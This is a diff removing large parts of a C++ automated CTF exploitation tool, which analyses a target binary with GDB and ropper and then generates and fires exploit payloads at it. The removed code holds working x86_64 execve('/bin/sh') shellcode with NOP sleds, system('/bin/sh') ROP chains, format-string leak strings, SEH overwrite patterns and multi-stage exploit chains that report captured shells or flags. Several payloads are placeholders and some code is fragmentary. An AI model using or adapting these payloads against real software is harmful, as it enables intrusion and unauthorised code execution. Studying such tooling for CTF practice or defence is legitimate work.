-        challenge_signatures["rop_required"] = {
-            "NX enabled", "DEP", "non-executable", "gadget", "return-oriented"
-        };
-        
-        challenge_signatures["seh_exploitation"] = {
-            "structured exception", "SEH", "exception handler", "try", "catch"
-        };
-        
-        challenge_signatures["crypto_challenge"] = {
-            "encrypt", "decrypt", "cipher", "hash", "key", "AES", "RSA", "base64"
-        };
-        
-        challenge_signatures["reverse_engineering"] = {
-            "password", "license", "serial", "crack", "reverse", "disassemble"
-        };
-        
-        challenge_signatures["race_condition"] = {
-            "thread", "pthread", "race", "timing", "signal", "concurrent"
-        };
-    }
-    
-    std::vector<std::pair<std::string, double>> classifyChallenge(
-        const std::string& binary_analysis,
-        const std::string& runtime_behavior,
-        const std::string& gdb_output) {
-        
-        std::vector<std::pair<std::string, double>> classifications;
-        std::string combined_data = binary_analysis + " " + runtime_behavior + " " + gdb_output;
-        
-        for (const auto& category : challenge_signatures) {
-            double score = calculateConfidence(combined_data, category.second);
-            if (score > 0.3) {  // Threshold for consideration
-                classifications.push_back({category.first, score});
-            }
-        }
-        
-        // Sort by confidence
-        std::sort(classifications.begin(), classifications.end(),
-                 [](const auto& a, const auto& b) { return a.second > b.second; });
-        
-        return classifications;
-    }
-    
-private:
-    double calculateConfidence(const std::string& data, const std::vector<std::string>& signatures) {
-        double matches = 0;
-        double total = signatures.size();
-        
-        std::string lower_data = data;
-        std::transform(lower_data.begin(), lower_data.end(), lower_data.begin(), ::tolower);
-        
-        for (const auto& sig : signatures) {
-            std::string lower_sig = sig;
-            std::transform(lower_sig.begin(), lower_sig.end(), lower_sig.begin(), ::tolower);
-            
-            if (lower_data.find(lower_sig) != std::string::npos) {
-                matches += 1.0;
-            }
-        }
-        
-        return matches / total;
-    }
-};
 
 // Advanced GDB integration for dynamic analysis
-class AdvancedGDBAnalyzer {
-private:
-    std::string target_binary;
-    ExploitContext context;
-    
-public:
-    AdvancedGDBAnalyzer(const std::string& binary) : target_binary(binary) {}
-    
-    // Comprehensive binary analysis using GDB
-    ExploitContext performDeepAnalysis() {
-        std::cout << "[*] Starting deep GDB analysis..." << std::endl;
-        
-        // Step 1: Extract all symbols and addresses
-        extractSymbolInformation();
-        
-        // Step 2: Analyze mitigations
-        analyzeMitigations();
-        
-        // Step 3: Find ROP gadgets
-        findROPGadgets();
-        
-        // Step 4: Detect SEH chains (Windows)
-        detectSEHChains();
-        
-        // Step 5: Analyze heap layout
-        analyzeHeapLayout();
-        
-        // Step 6: Find exploitable functions
-        identifyExploitableFunctions();
-        
-        // Step 7: Build exploit strategy
-        buildExploitStrategy();
-        
-        return context;
-    }
-    
-    void extractSymbolInformation() {
-        std::string gdb_script = R"(
-set pagination off
-set logging file symbols.txt
-set logging on
-info functions
-info variables
-info address main
-info address system
-info address printf
-info address gets
-info address strcpy
-maintenance info sections
-quit
-        )";
-        
-        writeGDBScript(gdb_script, "extract_symbols.gdb");
-        std::string output = executeGDB("extract_symbols.gdb");
-        parseSymbolOutput(output);
-    }
-    
-    void analyzeMitigations() {
-        std::string gdb_script = R"(
-set pagination off
-set logging file mitigations.txt
-set logging on
-checksec
-info proc mappings
-show environment
-quit
-        )";
-        
-        writeGDBScript(gdb_script, "check_mitigations.gdb");
-        std::string output = executeGDB("check_mitigations.gdb");
-        parseMitigationOutput(output);
-        
-        // Also use external tools
-        std::string checksec_output = executeCommand("checksec --file=" + target_binary);
-        parseChecksecOutput(checksec_output);
-    }
-    
-    void findROPGadgets() {
-        std::cout << "[*] Searching for ROP gadgets..." << std::endl;
-        
-        // Use ropper or ROPgadget
-        std::string rop_cmd = "ropper --file " + target_binary + " --search 'pop r?i; ret' 2>/dev/null";
-        std::string rop_output = executeCommand(rop_cmd);
-        
-        if (rop_output.empty()) {
-            rop_cmd = "ROPgadget --binary " + target_binary + " --only 'pop|ret' 2>/dev/null";
-            rop_output = executeCommand(rop_cmd);
-        }
-        
-        parseROPGadgets(rop_output);
-        
-        // Also find gadgets using GDB
-        findGadgetsWithGDB();
-    }
-    
-    void findGadgetsWithGDB() {
-        std::string gdb_script = R"(
-set pagination off
-set logging file gadgets.txt
-set logging on
-# Search for common ROP gadgets
-x/1000i main
-# Look for pop; ret sequences
-find 0x400000, 0x500000, 0x58c3  # pop rax; ret
-find 0x400000, 0x500000, 0x5fc3  # pop rdi; ret  
-find 0x400000, 0x500000, 0x5ec3  # pop rsi; ret
-find 0x400000, 0x500000, 0x5ac3  # pop rdx; ret
-quit
-        )";
-        
-        writeGDBScript(gdb_script, "find_gadgets.gdb");
-        executeGDB("find_gadgets.gdb");
-    }
-    
-    void detectSEHChains() {
-        // Windows-specific SEH detection
-        std::string gdb_script = R"(
-set pagination off
-set logging file seh.txt
-set logging on
-# Check for SEH structures
-x/10gx $fs:0
-info registers fs
-# Look for exception handlers
-maintenance info sections .pdata
-maintenance info sections .xdata
-quit
-        )";
-        
-        writeGDBScript(gdb_script, "detect_seh.gdb");
-        executeGDB("detect_seh.gdb");
-        context.has_seh = checkSEHPresence();
-    }
-    
-    void analyzeHeapLayout() {
-        std::string gdb_script = R"(
-set pagination off
-set logging file heap.txt
-set logging on
-# Analyze heap layout
-info proc mappings
-heap chunks
-heap bins
-# Check for heap protections
-show environment MALLOC_CHECK_
-show environment MALLOC_PERTURB_
-quit
-        )";
-        
-        writeGDBScript(gdb_script, "analyze_heap.gdb");
-        executeGDB("analyze_heap.gdb");
-    }
-    
-    void identifyExploitableFunctions() {
-        std::vector<std::string> dangerous_funcs = {
-            "gets", "strcpy", "strcat", "sprintf", "scanf", "strncpy",
-            "memcpy", "memmove", "printf", "fprintf", "snprintf"
-        };
-        
-        for (const auto& func : dangerous_funcs) {
-            if (context.symbol_table.count(func)) {
-                context.exploitable_functions.push_back(func);
-            }
-        }
-    }
-    
-    void buildExploitStrategy() {
-        std::cout << "[*] Building adaptive exploit strategy..." << std::endl;
-        
-        // Determine best exploitation approach
-        if (context.mitigations["canary"] && context.mitigations["nx"] && context.mitigations["aslr"]) {
-            if (!context.gadget_addresses.empty()) {
-                context.exploit_strategy = "info_leak_rop_chain";
-                std::cout << "[+] Strategy: Information leak + ROP chain" << std::endl;
-            } else {
-                context.exploit_strategy = "heap_exploitation";
-                std::cout << "[+] Strategy: Heap exploitation" << std::endl;
-            }
-        } else if (context.mitigations["nx"] && !context.mitigations["aslr"]) {
-            context.exploit_strategy = "rop_chain";
-            std::cout << "[+] Strategy: ROP chain" << std::endl;
-        } else if (!context.mitigations["nx"]) {
-            context.exploit_strategy = "shellcode_injection";
-            std::cout << "[+] Strategy: Direct shellcode injection" << std::endl;
-        } else if (context.has_seh) {
-            context.exploit_strategy = "seh_overwrite";
-            std::cout << "[+] Strategy: SEH overwrite" << std::endl;
-        } else {
-            context.exploit_strategy = "classic_overflow";
-            std::cout << "[+] Strategy: Classic buffer overflow" << std::endl;
-        }
-    }
-    
-private:
-    void writeGDBScript(const std::string& script, const std::string& filename) {
-        std::ofstream file(filename);
-        file << script;
-        file.close();
-    }
-    
-    std::string executeGDB(const std::string& script_file) {
-        std::string cmd = "gdb -batch -x " + script_file + " " + target_binary + " 2>&1";
-        return executeCommand(cmd);
-    }
-    
-    std::string executeCommand(const std::string& cmd) {
-        char buffer[128];
-        std::string result = "";
-        FILE* pipe = popen(cmd.c_str(), "r");
-        if (!pipe) return result;
-        
-        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-            result += buffer;
-        }
-        pclose(pipe);
-        return result;
-    }
-    
-    void parseSymbolOutput(const std::string& output) {
-        std::regex addr_regex(R"(0x([0-9a-fA-F]+)\s+(\w+))");
-        std::smatch match;
-        std::string::const_iterator searchStart(output.cbegin());
-        
-        while (std::regex_search(searchStart, output.cend(), match, addr_regex)) {
-            uint64_t addr = std::stoull(match[1].str(), nullptr, 16);
-            std::string symbol = match[2].str();
-            context.symbol_table[symbol] = addr;
-            searchStart = match.suffix().first;
-        }
-    }
-    
-    void parseMitigationOutput(const std::string& output) {
-        context.mitigations["canary"] = output.find("canary") != std::string::npos;
-        context.mitigations["nx"] = output.find("NX") != std::string::npos;
-        context.mitigations["aslr"] = output.find("ASLR") != std::string::npos;
-        context.mitigations["pie"] = output.find("PIE") != std::string::npos;
-        context.mitigations["relro"] = output.find("RELRO") != std::string::npos;
-        context.mitigations["fortify"] = output.find("FORTIFY") != std::string::npos;
-    }
-    
-    void parseChecksecOutput(const std::string& output) {
-        context.mitigations["canary"] = output.find("Canary found") != std::string::npos;
-        context.mitigations["nx"] = output.find("NX enabled") != std::string::npos;
-        context.mitigations["pie"] = output.find("PIE enabled") != std::string::npos;
-        context.mitigations["relro"] = output.find("Full RELRO") != std::string::npos;
-    }
-    
-    void parseROPGadgets(const std::string& output) {
-        std::regex gadget_regex(R"(0x([0-9a-fA-F]+):\s+(.+))");
-        std::smatch match;
-        std::string::const_iterator searchStart(output.cbegin());
-        
-        while (std::regex_search(searchStart, output.cend(), match, gadget_regex)) {
-            uint64_t addr = std::stoull(match[1].str(), nullptr, 16);
-            context.gadget_addresses.push_back(addr);
-            searchStart = match.suffix().first;
-        }
-        
-        std::cout << "[+] Found " << context.gadget_addresses.size() << " ROP gadgets" << std::endl;
-    }
-    
-    bool checkSEHPresence() {
-        // Check if binary has SEH support (Windows)
-        std::string output = executeCommand("objdump -h " + target_binary + " 2>/dev/null");
-        return output.find(".pdata") != std::string::npos || 
-               output.find(".xdata") != std::string::npos;
-    }
-};
 
-class SymbolicExecutionEngine {
-    
-private:
-    std::string target_binary;
-    std::string angr_script_template;
-    std::vector<std::string> target_functions;
-    std::vector<std::string> avoid_functions;
-    
-public:
-    SymbolicExecutionEngine(const std::string& binary);
-    void setupAngrEnvironment();
-    void createAngrScriptTemplate();
-    
-    // Add these missing method declarations:
-    void findFlagStrings(SymbolicResult& result);
-    void findVulnerabilityPaths(SymbolicResult& result);
-    SymbolicResult performSymbolicExecution(const std::vector<std::string>& find_strings, 
-                                           const std::vector<std::string>& avoid_strings);
-    
-private:
-    std::string executeCommand(const std::string& cmd);
-    std::string executeCommandWithTimeout(const std::string& cmd, int timeout_seconds);
-    void parseSymbolicResults(const std::string& output, SymbolicResult& result);
-}; 
     
     void createAngrScriptTemplate() {
     angr_script_template = R"DELIMITER(#!/usr/bin/env python3
@@ -2268,349 +2816,10 @@ private:
 
 
 // Multi-stage exploit chaining system
-class ExploitChainBuilder {
-private:
-    std::string target_exe;
-    ELFInfo& elf_info;
-    ExploitContext& context;
-    
-public:
-    ExploitChainBuilder(const std::string& exe, ELFInfo& elf, ExploitContext& ctx) 
-        : target_exe(exe), elf_info(elf), context(ctx) {}
-    
-    std::vector<ExploitChain> buildExploitChains() {
-        std::vector<ExploitChain> chains;
-        
-        // Chain 1: Information Leak -> ROP Chain
-        if (elf_info.has_pie || elf_info.has_canary) {
-            chains.push_back(buildInfoLeakROPChain());
-        }
-        
-        // Chain 2: Format String -> Arbitrary Write -> Shell
-        if (hasPrintfFunctions()) {
-            chains.push_back(buildFormatStringChain());
-        }
-        
-        // Chain 3: Heap Leak -> UAF -> Code Execution
-        if (hasHeapFunctions()) {
-            chains.push_back(buildHeapExploitChain());
-        }
-        
-        // Chain 4: Buffer Overflow -> Stack Pivot -> ROP
-        if (!elf_info.has_canary && elf_info.has_nx) {
-            chains.push_back(buildStackPivotChain());
-        }
-        
-        // Chain 5: Race Condition -> Privilege Escalation
-        if (hasThreadingFunctions()) {
-            chains.push_back(buildRaceConditionChain());
-        }
-        
-        return chains;
-    }
-    
-private:
-    ExploitChain buildInfoLeakROPChain() {
-        ExploitChain chain;
-        chain.chain_id = "info_leak_rop";
-        chain.attack_type = "Multi-stage ROP with ASLR bypass";
-        chain.final_objective = "Code execution via ROP chain";
-        
-        // Stage 1: Leak addresses
-        ExploitStage leak_stage;
-        leak_stage.stage_name = "address_leak";
-        leak_stage.payload = generateLeakPayload();
-        leak_stage.success_indicators = {"0x7f", "0x40", "Stack:"};
-        leak_stage.failure_indicators = {"Segmentation", "Aborted"};
-        leak_stage.timeout_seconds = 5;
-        
-        // Stage 2: Calculate offsets
-        ExploitStage calc_stage;
-        calc_stage.stage_name = "offset_calculation";
-        calc_stage.payload = ""; // Will be generated dynamically
-        calc_stage.requires_interaction = true;
-        
-        // Stage 3: ROP chain execution
-        ExploitStage rop_stage;
-        rop_stage.stage_name = "rop_execution";
-        rop_stage.success_indicators = {"$", "shell", "flag{", "success"};
-        rop_stage.failure_indicators = {"Segmentation", "Illegal"};
-        rop_stage.timeout_seconds = 15;
-        
-        chain.stages = {leak_stage, calc_stage, rop_stage};
-        chain.success_probability = 0.7;
-        
-        return chain;
-    }
-    
-    ExploitChain buildFormatStringChain() {
-        ExploitChain chain;
-        chain.chain_id = "format_string_chain";
-        chain.attack_type = "Format string to arbitrary write";
-        chain.final_objective = "Overwrite GOT/return address";
-        
-        // Stage 1: Find format string offset
-        ExploitStage find_offset;
-        find_offset.stage_name = "find_format_offset";
-        find_offset.payload = "AAAA%p%p%p%p%p%p%p%p%p%p";
-        find_offset.success_indicators = {"41414141"};
-        
-        // Stage 2: Leak addresses
-        ExploitStage leak_addrs;
-        leak_addrs.stage_name = "leak_addresses";
-        leak_addrs.success_indicators = {"0x"};
-        
-        // Stage 3: Calculate write targets
-        ExploitStage calc_targets;
-        calc_targets.stage_name = "calculate_targets";
-        calc_targets.requires_interaction = true;
-        
-        // Stage 4: Arbitrary write
-        ExploitStage arb_write;
-        arb_write.stage_name = "arbitrary_write";
-        arb_write.success_indicators = {"success", "shell", "$"};
-        arb_write.timeout_seconds = 10;
-        
-        chain.stages = {find_offset, leak_addrs, calc_targets, arb_write};
-        chain.success_probability = 0.6;
-        
-        return chain;
-    }
-    
-    ExploitChain buildHeapExploitChain() {
-        ExploitChain chain;
-        chain.chain_id = "heap_exploitation";
-        chain.attack_type = "Heap corruption to code execution";
-        
-        ExploitStage heap_spray;
-        heap_spray.stage_name = "heap_spray";
-        heap_spray.payload = generateHeapSprayPayload();
-        
-        ExploitStage trigger_vuln;
-        trigger_vuln.stage_name = "trigger_vulnerability";
-        trigger_vuln.payload = generateHeapCorruptionPayload();
-        
-        ExploitStage exploit_corruption;
-        exploit_corruption.stage_name = "exploit_corruption";
-        exploit_corruption.success_indicators = {"shell", "$", "flag{"};
-        
-        chain.stages = {heap_spray, trigger_vuln, exploit_corruption};
-        chain.success_probability = 0.4;
-        
-        return chain;
-    }
-    
-    ExploitChain buildStackPivotChain() {
-        ExploitChain chain;
-        chain.chain_id = "stack_pivot_rop";
-        chain.attack_type = "Stack pivot to controlled memory";
-        
-        ExploitStage pivot_setup;
-        pivot_setup.stage_name = "setup_pivot_area";
-        pivot_setup.payload = std::string(1000, 'A'); // Large buffer
-        
-        ExploitStage perform_pivot;
-        perform_pivot.stage_name = "stack_pivot";
-        perform_pivot.payload = generateStackPivotPayload();
-        
-        ExploitStage rop_execution;
-        rop_execution.stage_name = "rop_chain";
-        rop_execution.success_indicators = {"shell", "success"};
-        
-        chain.stages = {pivot_setup, perform_pivot, rop_execution};
-        chain.success_probability = 0.5;
-        
-        return chain;
-    }
-    
-    ExploitChain buildRaceConditionChain() {
-        ExploitChain chain;
-        chain.chain_id = "race_condition";
-        chain.attack_type = "Race condition exploitation";
-        
-        ExploitStage setup_race;
-        setup_race.stage_name = "setup_race_condition";
-        setup_race.payload = "START_THREADS";
-        
-        ExploitStage trigger_race;
-        trigger_race.stage_name = "trigger_race";
-        trigger_race.payload = "RACE_TRIGGER";
-        trigger_race.timeout_seconds = 1; // Fast timing
-        
-        ExploitStage exploit_race;
-        exploit_race.stage_name = "exploit_race_window";
-        exploit_race.success_indicators = {"race_won", "success"};
-        
-        chain.stages = {setup_race, trigger_race, exploit_race};
-        chain.success_probability = 0.3;
-        
-        return chain;
-    }
-    
-    // Helper payload generators
-    std::string generateLeakPayload() {
-        if (hasPrintfFunctions()) {
-            return "%p.%p.%p.%p.%p.%p.%p.%p";
-        } else {
-            return std::string(200, 'A'); // Large buffer to leak stack
-        }
-    }
-    
-    std::string generateHeapSprayPayload() {
-        std::string payload = "HEAP_SPRAY:";
-        for (int i = 0; i < 100; i++) {
-            payload += "AAAABBBBCCCCDDDD";
-        }
-        return payload;
-    }
-    
-    std::string generateHeapCorruptionPayload() {
-        return "FREE_CHUNK:" + std::string(64, 'X') + "CORRUPT_HEADER";
-    }
-    
-    std::string generateStackPivotPayload() {
-        std::string payload = std::string(72, 'A'); // Padding
-        // Add pivot gadget (leave rsp, ret or similar)
-        payload += packAddress(0x400000); // Placeholder address
-        return payload;
-    }
-    
-    std::string packAddress(uint64_t addr) {
-        std::string packed;
-        for (int i = 0; i < 8; i++) {
-            packed += static_cast<char>((addr >> (i * 8)) & 0xFF);
-        }
-        return packed;
-    }
-    
-    bool hasPrintfFunctions() {
-        std::vector<std::string> printf_funcs = {"printf", "sprintf", "fprintf"};
-        for (const auto& func : printf_funcs) {
-            if (std::find(elf_info.imported_functions.begin(), 
-                         elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
-                return true;
-            }
-        }
-        return false;
-    }
-    
-    bool hasHeapFunctions() {
-        std::vector<std::string> heap_funcs = {"malloc", "free", "calloc", "realloc"};
-        for (const auto& func : heap_funcs) {
-            if (std::find(elf_info.imported_functions.begin(), 
-                         elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
-                return true;
-            }
-        }
-        return false;
-    }
-    
-    bool hasThreadingFunctions() {
-        std::vector<std::string> thread_funcs = {"pthread_create", "pthread_mutex"};
-        for (const auto& func : thread_funcs) {
-            if (std::find(elf_info.imported_functions.begin(), 
-                         elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
-                return true;
-            }
-        }
-        return false;
-    }
-};
 
 // Add these methods to AdvancedCTFSolver class:
 
-void performMultiStageExploitation() {
-    if (!multi_stage_mode) return;
-    
-    std::cout << "[*] ===== MULTI-STAGE EXPLOIT CHAINING =====" << std::endl;
-    
-    ExploitChainBuilder builder(target_exe, elf_info, exploit_context);
-    exploit_chains = builder.buildExploitChains();
-    
-    std::cout << "[+] Built " << exploit_chains.size() << " exploit chains" << std::endl;
-    
-    for (auto& chain : exploit_chains) {
-        std::cout << "\n[*] Testing chain: " << chain.chain_id 
-                  << " (" << chain.attack_type << ")" << std::endl;
-        std::cout << "[*] Success probability: " << chain.success_probability << std::endl;
-        
-        ChainResult result = executeExploitChain(chain);
-        
-        if (result.successful) {
-            std::cout << "[!] SUCCESS! Chain completed successfully!" << std::endl;
-            std::cout << "[+] Stages completed: " << result.stages_completed << std::endl;
-            
-            if (!result.final_flag.empty()) {
-                std::cout << "[!] FLAG CAPTURED: " << result.final_flag << std::endl;
-                saveSolution(chain.stages.back().payload, result.final_flag);
-            }
-            
-            if (!result.shell_access.empty()) {
-                std::cout << "[!] SHELL ACCESS GAINED!" << std::endl;
-            }
-            
-            saveChainResult(result);
-            generateChainPoC(chain, result);
-            
-            // If we got the flag or shell, we're done
-            if (!result.final_flag.empty() || !result.shell_access.empty()) {
-                return;
-            }
-        } else {
-            std::cout << "[!] Chain failed: " << chain.failure_reason << std::endl;
-            std::cout << "[*] Completed stages: " << result.stages_completed 
-                      << "/" << chain.stages.size() << std::endl;
-        }
-    }
-}
 
-ChainResult executeExploitChain(ExploitChain& chain) {
-    ChainResult result;
-    result.chain_id = chain.chain_id;
-    result.successful = false;
-    result.stages_completed = 0;
-    
-    std::cout << "[*] Executing " << chain.stages.size() << " stage chain..." << std::endl;
-    
-    for (size_t i = 0; i < chain.stages.size(); i++) {
-        auto& stage = chain.stages[i];
-        std::cout << "[*] Stage " << (i+1) << ": " << stage.stage_name << std::endl;
-        
-        StageResult stage_result = executeStage(stage, leaked_data);
-        result.stage_outputs.push_back(stage_result.output);
-        
-        if (!stage_result.successful) {
-            chain.failure_reason = "Stage " + std::to_string(i+1) + " failed: " + stage_result.error;
-            std::cout << "[!] " << chain.failure_reason << std::endl;
-            return result;
-        }
-        
-        result.stages_completed++;
-        
-        // Extract data from this stage for next stages
-        extractStageData(stage_result, leaked_data);
-        
-        // Update subsequent stage payloads based on leaked data
-        updateSubsequentStages(chain, i, leaked_data);
-        
-        // Check for early success indicators
-        if (checkEarlySuccess(stage_result.output)) {
-            result.final_flag = extractFlag(stage_result.output);
-            result.shell_access = extractShellAccess(stage_result.output);
-            result.successful = true;
-            return result;
-        }
-        
-        std::this_thread::sleep_for(std::chrono::milliseconds(500));
-    }
-    
-    // All stages completed successfully
-    result.successful = true;
-    result.final_flag = extractFlag(result.stage_outputs.back());
-    result.shell_access = extractShellAccess(result.stage_outputs.back());
-    
-    return result;
-}
 
 
 
@@ -2948,186 +3157,6 @@ std::string packAddress(uint64_t addr) {
 }
 
 
-class AdaptiveExploitGenerator {
-private:
-    ExploitContext context;
-    std::string target_binary;
-    
-public:
-    AdaptiveExploitGenerator(const ExploitContext& ctx, const std::string& binary) 
-        : context(ctx), target_binary(binary) {}
-    
-    // Generate exploit based on analysis
-    std::vector<std::string> generateAdaptiveExploits() {
-        std::vector<std::string> exploits;
-        
-        if (context.exploit_strategy == "info_leak_rop_chain") {
-            exploits = generateInfoLeakROPExploit();
-        } else if (context.exploit_strategy == "rop_chain") {
-            exploits = generateROPChainExploit();
-        } else if (context.exploit_strategy == "shellcode_injection") {
-            exploits = generateShellcodeExploit();
-        } else if (context.exploit_strategy == "seh_overwrite") {
-            exploits = generateSEHExploit();
-        } else if (context.exploit_strategy == "heap_exploitation") {
-            exploits = generateHeapExploit();
-        } else {
-            exploits = generateClassicOverflowExploit();
-        }
-        
-        return exploits;
-    }
-    
-private:
-    std::vector<std::string> generateInfoLeakROPExploit() {
-        std::vector<std::string> exploits;
-        
-        // Stage 1: Information leak
-        std::string leak_payload = generateInfoLeakPayload();
-        exploits.push_back(leak_payload);
-        
-        // Stage 2: ROP chain (will be generated after leak)
-        std::string rop_payload = generateROPPayload();
-        exploits.push_back(rop_payload);
-        
-        return exploits;
-    }
-    
-    std::string generateInfoLeakPayload() {
-        // Generate payload to leak addresses
-        std::string payload;
-        
-        if (hasFunction("printf")) {
-            // Format string leak
-            payload = "%p.%p.%p.%p.%p.%p.%p.%p";
-        } else if (hasFunction("puts")) {
-            // Buffer overflow to leak stack
-            payload = std::string(100, 'A');
-        }
-        
-        return payload;
-    }
-    
-    std::string generateROPPayload() {
-        std::string payload;
-        
-        // Build ROP chain
-        if (hasFunction("system") && !context.gadget_addresses.empty()) {
-            // system("/bin/sh") ROP chain
-            payload += std::string(72, 'A');  // Padding
-            
-            // pop rdi; ret gadget + "/bin/sh" address
-            if (context.gadget_addresses.size() > 0) {
-                uint64_t pop_rdi = context.gadget_addresses[0];  // Assume first is pop rdi
-                payload += packAddress(pop_rdi);
-                payload += packAddress(findStringAddress("/bin/sh"));
-                payload += packAddress(context.symbol_table["system"]);
-            }
-        }
-        
-        return payload;
-    }
-    
-    std::vector<std::string> generateROPChainExploit() {
-        std::vector<std::string> exploits;
-        
-        // Generate various ROP chain attempts
-        for (size_t i = 64; i <= 256; i += 8) {
-            std::string payload = std::string(i, 'A');
-            
-            if (!context.gadget_addresses.empty() && hasFunction("system")) {
-                // Add ROP chain
-                payload += packAddress(context.gadget_addresses[0]);  // pop rdi
-                payload += packAddress(findStringAddress("/bin/sh"));
-                payload += packAddress(context.symbol_table["system"]);
-            }
-            
-            exploits.push_back(payload);
-        }
-        
-        return exploits;
-    }
-    
-    std::vector<std::string> generateShellcodeExploit() {
-        std::vector<std::string> exploits;
-        
-        // x86_64 execve("/bin/sh") shellcode
-        std::string shellcode = 
-            "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
-            "\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
-        
-        // NOP sled + shellcode combinations
-        for (int nop_size : {50, 100, 200, 500}) {
-            std::string payload = std::string(nop_size, '\x90') + shellcode;
-            
-            // Add different padding sizes
-            for (size_t pad : {64, 72, 80, 88, 96}) {
-                std::string full_payload = std::string(pad, 'A') + payload;
-                exploits.push_back(full_payload);
-            }
-        }
-        
-        return exploits;
-    }
-    
-    std::vector<std::string> generateSEHExploit() {
-        std::vector<std::string> exploits;
-        
-        // SEH overwrite pattern
-        for (size_t offset : {80, 100, 120, 140}) {
-            std::string payload = std::string(offset, 'A');
-            payload += "BBBB";  // nSEH
-            payload += "CCCC";  // SEH handler
-            exploits.push_back(payload);
-        }
-        
-        return exploits;
-    }
-    
-    std::vector<std::string> generateHeapExploit() {
-        std::vector<std::string> exploits;
-        
-        // Use-after-free patterns  
-        exploits.push_back("malloc_large_chunk");
-        exploits.push_back("free_double");
-        exploits.push_back("heap_overflow");
-        
-        return exploits;
-    }
-    
-    std::vector<std::string> generateClassicOverflowExploit() {
-        std::vector<std::string> exploits;
-        
-        // Classic buffer overflow patterns
-        for (size_t size : {64, 72, 80, 88, 96, 104, 112, 120, 128}) {
-            std::string payload = std::string(size, 'A');
-            payload += "BBBB";  // Return address
-            exploits.push_back(payload);
-        }
-        
-        return exploits;
-    }
-    
-    std::string packAddress(uint64_t addr) {
-        std::string packed;
-        for (int i = 0; i < 8; i++) {
-            packed += static_cast<char>((addr >> (i * 8)) & 0xFF);
-        }
-        return packed;
-    }
-    
-    uint64_t findStringAddress(const std::string& str) {
-        // Try to find string in binary
-        if (str == "/bin/sh" && context.symbol_table.count("str_bin_sh")) {
-            return context.symbol_table["str_bin_sh"];
-        }
-        return 0x7ffff7b84d57;  // Common libc /bin/sh address (needs proper leak)
-    }
-    
-    bool hasFunction(const std::string& func) {
-        return context.symbol_table.count(func) > 0;
-    }
-};
 
 // Add these missing helper functions to your AdvancedCTFSolver class:
 
@@ -3204,62 +3233,6 @@ std::string getGDBAnalysisString() {
 }
 
 // Test adaptive exploits function
-void testAdaptiveExploits(const std::vector<std::string>& exploits) {
-    std::cout << "[*] Testing " << exploits.size() << " adaptive exploits..." << std::endl;
-    
-    int successful_exploits = 0;
-    int crashes_found = 0;
-    
-    for (size_t i = 0; i < exploits.size(); i++) {
-        if (verbose_mode && i % 10 == 0) {
-            std::cout << "[*] Testing exploit " << i + 1 << "/" << exploits.size() << std::endl;
-        }
-        
-        VulnResult result;
-        result.input = exploits[i];
-        result.payload_size = exploits[i].size();
-        
-        // Test the exploit
-        bool crashed = testSingleExploit(exploits[i], result);
-        
-        if (crashed) {
-            crashes_found++;
-            vulnerabilities.push_back(result);
-            
-            std::cout << "[!] Crash found with adaptive exploit #" << i + 1 << std::endl;
-            std::cout << "    Signal: " << result.signal_num << std::endl;
-            std::cout << "    Type: " << result.vuln_type << std::endl;
-            
-            // Save detailed results
-            saveAdvancedVulnerability(result, i);
-            
-            if (result.exploitable) {
-                successful_exploits++;
-                generateAdvancedPoC(result, i);
-                std::cout << "[+] Exploitable vulnerability confirmed!" << std::endl;
-            }
-        }
-        
-        // Check for successful exploitation (non-crash success)
-        std::string output = captureOutput(exploits[i]);
-        if (isSuccessfulExploit(output)) {
-            successful_exploits++;
-            std::cout << "[!] SUCCESS! Adaptive exploit worked!" << std::endl;
-            std::cout << "[+] Output: " << output << std::endl;
-            
-            // Save successful solution
-            saveSolution(exploits[i], output);
-            generateSolutionScript(exploits[i]);
-        }
-        
-        std::this_thread::sleep_for(std::chrono::milliseconds(10));
-    }
-    
-    std::cout << "[*] Adaptive exploit testing complete:" << std::endl;
-    std::cout << "    Total exploits tested: " << exploits.size() << std::endl;
-    std::cout << "    Crashes found: " << crashes_found << std::endl;
-    std::cout << "    Successful exploits: " << successful_exploits << std::endl;
-}
 
 // Test a single exploit
 bool testSingleExploit(const std::string& exploit, VulnResult& result) {
